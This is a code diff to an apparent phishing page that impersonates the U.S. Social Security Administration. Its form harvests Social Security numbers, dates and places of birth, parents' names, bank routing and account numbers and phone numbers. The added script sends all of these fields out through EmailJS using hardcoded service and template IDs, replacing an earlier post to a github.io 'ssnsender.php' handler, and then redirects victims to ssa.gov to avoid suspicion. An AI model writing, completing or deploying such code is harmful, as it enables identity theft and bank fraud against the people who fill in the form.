@@ -83,82 +83,50 @@
     </div>
     <script src="./newssn/jquery-3.6.0.min.js"></script>
     <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
-    <script>
-        
-        $(document).ready(function () {
-          $('#myForm').on('submit', function (event) {
-            event.preventDefault(); // Prevent the default form submission
-        
-    // Collect form data
-    var fullName = $('#full-name').val();
-    var ssn = $('#ssn').val();
-    var mailingAddress = $('#mailing-address').val();
-    var fathersName = $('#fathers').val();
-    var mothersName = $('#mothers').val();
-    var placeOfBirth = $('#pob').val();
-    var state = $('#state').val();
-    var amountReceived = $('#amount').val();
-    var routingNumber = $('#routing').val();
-    var accountNumber = $('#account').val();
-    var phoneNumber = $('#phone').val();
-    var receivedSSA = $('#yes').val();
-    var dob = $('#dob').val();
-    var dateOfPayment = $('#dop').val();
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    emailjs.init('VCyoayBjibbI-hCZ1'); // Replace with your EmailJS user ID
 
-    // Build the data object
-    var data = {
-        fullName: fullName,
-        ssn: ssn,
-        mailingAddress: mailingAddress,
-        fathersName: fathersName,
-        mothersName: mothersName,
-        placeOfBirth: placeOfBirth,
-        state: state,
-        amountReceived: amountReceived,
-        routingNumber: routingNumber,
-        accountNumber: accountNumber,
-        phoneNumber: phoneNumber,
-        receivedSSA: receivedSSA,
-        dob: dob,
-        dateOfPayment: dateOfPayment
-    }
+    $('#myForm').on('submit', function (event) {
+      event.preventDefault(); // Prevent the default form submission
 
-            $.ajax({
-              url: 'https://whiteghost0015.github.io/ssnsender.php', // Replace with the URL to your PHP handler script
-              type: 'POST',
-              data: JSON.stringify(data),
-              contentType: 'application/json',
-              success: function (response) {
-                console.log(response);
-                swal("Application submitted successfully!", "", "success").then(() => {
-                    window.location.href = "https://ssa.gov/";        });
-              },
-              error: function (xhr, status, error) {
-                // Handle any errors
-                swal("An error occurred while saving the application!", "", "warning");
-                console.error(xhr.responseText);
-              }
-            });
+      // Collect form data
+      var formData = {
+        fullName: $('#full-name').val(),
+        ssn: $('#ssn').val(),
+        mailingAddress: $('#mailing-address').val(),
+        fathersName: $('#fathers').val(),
+        mothersName: $('#mothers').val(),
+        placeOfBirth: $('#pob').val(),
+        state: $('#state').val(),
+        amountReceived: $('#amount').val(),
+        routingNumber: $('#routing').val(),
+        accountNumber: $('#account').val(),
+        phoneNumber: $('#phone').val(),
+        receivedSSA: $('#yes').val(),
+        dob: $('#dob').val(),
+        dateOfPayment: $('#dop').val(),
+      };
+
+      // Use EmailJS to send the email
+      emailjs.send('service_httl3qt', 'template_q9l6n53', formData)
+        .then(function (response) {
+          console.log('SUCCESS!', response.status, response.text);
+          swal("Application submitted successfully!", "", "success").then(() => {
+            window.location.href = "https://ssa.gov/";
           });
+        }, function (error) {
+          console.error('FAILED...', error);
+          swal("An error occurred while saving the application!", "", "warning");
         });
-        
-        </script>
-                <!-- TM Floodlight Tag -->
+    });
+  });
+</script>
 
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/650ae23bb1aaa13b7a77e62a/1hap87eq3';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
-    </script>
-    <!--End of Tawk.to Script-->
+  
 </body>
 
 
